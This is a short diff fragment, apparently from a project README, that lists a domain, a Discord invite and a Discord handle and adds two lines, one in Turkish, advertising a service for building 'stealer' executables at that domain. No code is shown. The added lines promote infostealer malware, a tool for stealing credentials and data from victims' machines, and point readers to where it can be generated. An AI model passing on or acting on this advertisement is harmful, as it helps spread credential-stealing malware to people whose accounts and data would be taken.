@@ -14,3 +14,5 @@ DOMAİN - takinti.xyz
 https://discord.gg/s4s4
 discord : takintilii
 
+Stealer build -> takinti.xyz
+stealer exe oluşturmak için -> takinti.xyz
